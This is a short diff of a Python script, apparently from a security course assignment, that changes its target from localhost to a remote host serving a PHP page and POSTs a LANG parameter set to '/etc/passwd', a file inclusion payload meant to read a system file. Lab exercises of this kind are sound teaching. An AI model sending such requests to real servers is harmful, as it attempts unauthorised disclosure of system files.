@@ -1,8 +1,8 @@
 from urllib import request, parse
 import webbrowser
 
-base_url = "http://localhost:20080/Assignment/case03/case03.php"
-# base_url = "http://iu.ru/Assignment/case03/case03.php"
+# base_url = "http://localhost:20080/Assignment/case03/case03.php"
+base_url = "http://iu.ru/Assignment/case03/case03.php"
 values = {"LANG": "/etc/passwd"}
 data = parse.urlencode(values).encode()
 req = request.Request(base_url, data=data)
